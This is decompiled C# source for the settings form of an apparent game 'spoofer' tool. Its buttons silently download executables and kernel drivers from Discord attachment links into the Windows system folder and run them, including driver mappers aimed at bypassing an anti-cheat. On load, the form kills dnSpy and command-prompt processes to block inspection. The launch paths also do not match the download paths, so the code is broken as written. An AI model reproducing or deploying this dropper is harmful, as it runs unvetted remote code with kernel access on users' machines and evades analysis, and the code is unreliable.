using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Windows.Forms;
using Guna.UI2.WinForms;

namespace Helix_Spoofer
{
	// Token: 0x0200000A RID: 10
	public partial class SpoofSettings : Form
	{
		// Token: 0x06000038 RID: 56 RVA: 0x00006F1E File Offset: 0x0000511E
		public SpoofSettings()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000039 RID: 57 RVA: 0x00006F38 File Offset: 0x00005138
		private void guna2Button1_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/1053049288306987059/1056256940658917486/SpooferLoader.exe", "C:\\Windows\\System\\SpooferLoader.exe");
			Process.Start("C:\\Windows\\System\\SpooferLoader.exe");
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00006F68 File Offset: 0x00005168
		private void guna2Button2_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/1027664258701467758/1030849244619350016/kdmapper1.exe", "C:\\Windows\\System\\kdmapper1.exe");
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/1027969341720895488/1027969613599887471/driver_1.sys", "C:\\Windows\\System\\driver_1.sys");
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/986428580198240278/1034996033572323369/Vanguardmapper.exe", "C:\\Windows\\System\\Vanguardmapper.exe");
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/986428580198240278/1034996071836954754/dribber.sys", "C:\\Windows\\System\\dribber.sys");
			Process.Start("C:\\\\Windows\\\\System32\\\\kdmapper1.exe C:\\\\Windows\\\\System32\\\\driver_1.sys");
			Process.Start("C:\\\\Windows\\\\System32\\\\Vanguardmapper.exe C:\\\\Windows\\\\System32\\\\dribber.sys");
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00006FD8 File Offset: 0x000051D8
		private void SpoofSettings_Load(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("dnSpy");
			foreach (Process process in processesByName)
			{
				process.Kill();
			}
			Process[] processesByName2 = Process.GetProcessesByName("cmd.exe");
			foreach (Process process2 in processesByName2)
			{
				process2.Kill();
			}
		}

		// Token: 0x0600003C RID: 60 RVA: 0x00007044 File Offset: 0x00005244
		private void guna2Button3_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/1053049288306987059/1056256929669845094/applecleaner_1.exe", "C:\\Windows\\System\\applecleaner_1.exe");
			Process.Start("C:\\Windows\\System\\applecleaner_1.exe");
		}
	}
}
